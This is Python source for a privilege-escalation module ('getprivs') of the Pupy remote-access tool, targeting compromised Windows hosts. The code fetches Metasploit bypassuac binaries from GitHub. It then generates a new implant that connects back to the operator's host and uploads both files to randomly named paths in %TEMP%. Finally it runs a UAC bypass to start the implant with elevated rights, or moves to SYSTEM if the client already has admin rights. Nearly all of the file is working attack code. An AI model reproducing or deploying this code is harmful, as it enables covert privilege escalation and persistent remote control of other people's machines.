# -*- coding: UTF8 -*-
from pupylib.PupyModule import *
import pupygen
from urllib2 import urlopen
import os
import random
import string
from modules import migrate
from modules import memory_exec

__class_name__="GetPrivsModule"

class GetPrivsModule(PupyModule):
	""" try to work pupy magic """

	def init_argparse(self):
		self.arg_parser=PupyArgumentParser(prog="getprivs", description=self.__doc__)
		self.arg_parser.add_argument('-e','--pupy', help='Use an alternative file')
		#self.arg_parser.add_argument('-m','--method', choices=['binary','memexec','reflective'], required=True, help='UAC bypass method')

	@windows_only
	def is_compatible(self):
		pass

	def run(self, args):
		bypass_file=["bypassuac-x64.exe","bypassuac-x86.exe","bypassuac-x64.dll","bypassuac-x86.dll"]
		for bin in bypass_file:
			if not os.path.exists(bin):
				self.error(bin + " not found...")
				bypassuac=urlopen('https://github.com/rapid7/metasploit-framework/blob/master/data/post/'+bin+'?raw=true')
				f=open(bin,'wb')
				f.write(bypassuac.read())
				f.close()

		AdminCheck=self.client.conn.modules["pupwinutils.security"].AdminCheck()

		if AdminCheck==False:
			self.info("Not ADMIN, attempting to bypassUAC")
				
			exebuff=b""
			if args.pupy:
				with open(args.pupy,'rb') as f:
					exebuff=f.read()
				self.info("loading %s ..."%args.pupy)
			else:
				#retrieving conn info
				res=self.client.conn.modules['pupy'].get_connect_back_host()
				host, port=res.rsplit(':',1)
				#generating exe
				self.info("generating exe ...")
				if self.client.desc['proc_arch']=="64bit":
					exebuff=pupygen.get_edit_pupyx64_exe(host, port, self.client.pupsrv.transport)
				else:
					exebuff=pupygen.get_edit_pupyx86_exe(host, port, self.client.pupsrv.transport)
	
			self.client.load_package("pupwinutils.security", force=True)

			try:
				#if args.method=="binary":
				if self.client.desc['proc_arch']=="64bit":
					bpuac=os.path.join(os.getcwd(),b"bypassuac-x64.exe")
				else:
					bpuac=os.path.join(os.getcwd(),b"bypassuac-x86.exe")

				with open(bpuac,'rb') as f:
					bpuacbuff=f.read()

				remote_path={'bypass':'','pupy':''}
				for k in remote_path.keys():
					remote_path[k]=self.client.conn.modules['os.path'].expandvars("%TEMP%\\{}.exe".format(''.join([random.choice(string.ascii_lowercase) for x in range(0,random.randint(6,12))])))
					self.info("uploading %s to %s ..."%(k,remote_path[k]))
					#uploading
					rf=self.client.conn.builtin.open(remote_path[k], "wb")

					chunk_size=16000
					pos=0

					self.info("working %s ..."%k)
					while True:
						if k=='pupy':
							buf=exebuff[pos:pos+chunk_size]
						elif k=='bypass':
							buf=bpuacbuff[pos:pos+chunk_size]
						if not buf:
							break
						rf.write(buf)
						pos+=chunk_size
					rf.close()
					self.success("upload successful")
				print remote_path['bypass'], remote_path['pupy']
				self.client.conn.modules["pupwinutils.security"].ByPassUAC_bin(remote_path['bypass'], remote_path['pupy'])
				self.success("UAC stuff bypassed !")

			except:
				self.error("Could not bypassuac")
		else:
			try:
				self.client.conn.modules["pupwinutils.security"].RunAsSystem()
				self.success("SYSTEM stuff enabled !")
			except:
				self.error("Could not run as SYSTEM...")
